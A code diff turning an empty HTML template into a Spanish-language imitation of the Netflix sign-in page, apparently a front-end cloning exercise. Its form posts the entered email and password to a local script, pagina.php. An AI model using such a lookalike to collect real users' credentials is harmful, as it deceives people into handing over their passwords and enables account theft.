@@ -1,13 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="css/style.css">
-    <title>Document</title>
-</head>
-<body>
-    <div class="container"></div>
-</body>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="css/style.css" />
+        <title>Netflix</title>
+    </head>
+    <body>
+        <img src="img/logo.png" alt="" />
+        <div class="content row justify-center align-center">
+            <div class="myform">
+                <h2>Iniciar sesión</h2>
+                <form action="pagina.php" method="post">
+                    <input
+                        type="text"
+                        name="emailnum"
+                        placeholder="Correo electrónico o número de telefono"
+                    />
+                    <input
+                        type="password"
+                        name="password"
+                        placeholder="Contraseña"
+                    />
+                    <input type="submit" value="Iniciar sesión" />
+                    <div class="row justify-between align-center w-100pp mb-m">
+                        <div class="left row align-center">
+                            <input
+                                type="checkbox"
+                                name="remember"
+                                id="remember"
+                            />Recuérdame
+                        </div>
+                        <a href="#">¿Necesitas ayuda?</a>
+                    </div>
+                    <div class="row align-center">
+                        <a href="#"
+                            ><img src="img/facebookico.png" alt="" width="18px"
+                        /></a>
+                        <a href="#"> Iniciar sesión con Facebook</a>
+                    </div>
+                    <div class="my-10">
+                        <span class="txt-big">¿Todavía sin Netflix?</span>
+                        <a href="#">
+                            <span class="txt-big txt-white">
+                                Suscríbete ya
+                            </span>
+                        </a>
+                    </div>
+                    Esta página utiliza Google reCAPTCHA para garantizar que no
+                    eres un robot.
+                    <a href="#">
+                        <span class="txt-blue"> Más información </span>
+                    </a>
+                </form>
+            </div>
+        </div>
+    </body>
 </html>
